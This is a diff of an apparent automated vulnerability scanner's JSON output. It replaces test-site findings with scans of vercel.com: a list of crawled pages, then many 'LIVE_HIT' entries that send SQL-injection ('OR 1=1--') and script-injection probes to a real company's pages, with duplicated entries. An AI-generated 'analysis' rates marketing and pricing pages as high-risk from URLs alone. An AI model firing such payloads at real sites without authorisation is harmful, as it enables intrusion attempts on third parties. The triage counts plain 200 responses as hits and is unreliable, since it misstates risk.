@@ -1,11 +1,945 @@
 {
-    "total_kills": 742,
-    "last_scan": "2025-12-16",
+    "ai_analysis": "Okay, here's an educational triage of the scouted findings, keeping in mind this is based solely on the URLs provided and therefore highly speculative. A real audit would require much deeper investigation.\n\n**Finding 1: `https://vercel.com/botid`**\n\n*   **Risk Level:**  High (Potentially Critical, requires more investigation)\n*   **Business Impact:**  Account Compromise, Data Breach, Reputation Damage, Service Disruption\n*   **Summary:** This URL suggests the existence of a bot identity endpoint. If this endpoint is vulnerable to unauthorized access or manipulation, it could allow attackers to impersonate the bot, potentially gaining elevated privileges, accessing sensitive data, or performing malicious actions within the Vercel platform.\n\n**Finding 2: `https://vercel.com/templates/svelte`**\n\n*   **Risk Level:** Medium\n*   **Business Impact:** Cross-Site Scripting (XSS), Code Injection, Phishing, Supply Chain Vulnerability\n*   **Summary:**  The Svelte templates page could be vulnerable to XSS or code injection attacks. If a malicious actor can inject malicious code into a template, users who deploy applications based on that template could unknowingly inherit and deploy the malicious code, leading to compromise of their applications.\n\n**Finding 3: `https://vercel.com/pricing`**\n\n*   **Risk Level:** Low\n*   **Business Impact:**  Data Leakage (Potentially), Misinformation, Denial of Service\n*   **Summary:**  While seemingly innocuous, pricing pages can sometimes be vulnerable.  Attackers may attempt to manipulate the pricing information displayed or extract sensitive details about pricing strategies or customer segments from the page source or associated APIs, or even use the page for denial of service (DoS) attacks.\n",
     "findings": [
-        {"type": "SQLi", "target": "http://testphp.vulnweb.com/listproducts.php?cat=1"},
-        {"type": "XSS", "target": "http://testphp.vulnweb.com/search.php?test=query"},
-        {"type": "RCE", "target": "http://testphp.vulnweb.com/admin/login.php"},
-        {"type": "LFI", "target": "http://testphp.vulnweb.com/showimage.php?file=..%2f"},
-        {"type": "Bypass", "target": "http://testphp.vulnweb.com/userinfo.php"}
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/botid"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/templates/svelte"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/pricing"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/ai-gateway/models"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/ai-gateway"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/new"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/templates/astro"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/templates/nuxt"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/customers"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/domains"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/templates/nextjs"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/changelog"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/agent"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/solutions/design-engineering"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/contact/sales/demo"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/templates/react"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/legal/privacy-policy"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/marketplace"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/security"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/products/observability"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/security/web-application-firewall"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/solutions/composable-commerce"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/solutions/web-apps"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/solutions/turborepo"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/templates/python"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/help"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/events"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/security/bot-management"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/agents"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/solutions/nextjs"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/contact"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/templates"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/kb"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/partners/solution-partners"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/products/managed-infrastructure"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/home"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/products/previews"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/careers"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/solutions/multi-tenant-saas"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/blog"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/sandbox"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/about"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/shipped"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/academy"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/solutions/marketing-sites"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/enterprise"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/startups"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/solutions/platform-engineering"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/contact/sales"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/press"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/contact/sales/enterprise-trial"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/ai"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/partners"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/solutions/ai-apps"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/docs"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/resources"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/fluid"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/integrations"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/products/rendering"
+        },
+        {
+            "type": "SCOUTED",
+            "target": "https://vercel.com/frameworks/nextjs"
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/botid?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/botid?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/templates/svelte?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/templates/svelte?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/pricing?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/pricing?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/ai-gateway/models?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/ai-gateway/models?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/ai-gateway?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/ai-gateway?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/new?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/new?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/templates/astro?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/templates/astro?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/templates/nuxt?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/templates/nuxt?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/customers?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/customers?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/domains?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/domains?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/templates/nextjs?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/templates/nextjs?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/changelog?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/changelog?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/agent?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/agent?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/solutions/design-engineering?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/solutions/design-engineering?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/contact/sales/demo?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/contact/sales/demo?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/templates/react?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/templates/react?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/legal/privacy-policy?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/legal/privacy-policy?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/marketplace?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/marketplace?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/security?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/security?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/products/observability?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/products/observability?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/security/web-application-firewall?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/security/web-application-firewall?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/solutions/composable-commerce?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/solutions/composable-commerce?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/solutions/web-apps?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/solutions/web-apps?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/solutions/turborepo?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/solutions/turborepo?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/templates/python?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/templates/python?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/help?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/help?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/events?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/events?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/security/bot-management?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/security/bot-management?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/agents?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/agents?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/solutions/nextjs?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/solutions/nextjs?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/contact?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/contact?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/templates?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/templates?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/kb?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/kb?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/partners/solution-partners?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/partners/solution-partners?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/products/managed-infrastructure?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/products/managed-infrastructure?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/home?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/home?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/products/previews?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/products/previews?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/careers?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/careers?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/solutions/multi-tenant-saas?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/solutions/multi-tenant-saas?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/blog?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/blog?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/sandbox?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/sandbox?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/about?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/about?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/shipped?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/shipped?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/academy?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/academy?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/solutions/marketing-sites?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/solutions/marketing-sites?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/enterprise?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/enterprise?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/startups?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/startups?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/solutions/platform-engineering?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/solutions/platform-engineering?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/contact/sales?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/contact/sales?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/press?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/press?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/contact/sales/enterprise-trial?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/contact/sales/enterprise-trial?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/ai?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/ai?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/partners?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/partners?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/solutions/ai-apps?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/solutions/ai-apps?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/docs?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/docs?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/resources?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/resources?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/fluid?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/fluid?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/integrations?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/integrations?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/products/rendering?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/products/rendering?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/frameworks/nextjs?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/frameworks/nextjs?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/botid?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/botid?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/templates/svelte?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/templates/svelte?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/pricing?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/pricing?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/ai-gateway/models?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/ai-gateway/models?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/ai-gateway?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/ai-gateway?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/new?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/new?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/templates/astro?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/templates/astro?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/templates/nuxt?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/templates/nuxt?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/customers?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/customers?id=<script>alert(1)</script>",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/domains?id=' OR 1=1--",
+            "code": 200
+        },
+        {
+            "type": "LIVE_HIT",
+            "target": "https://vercel.com/domains?id=<script>alert(1)</script>",
+            "code": 200
+        }
     ]
 }
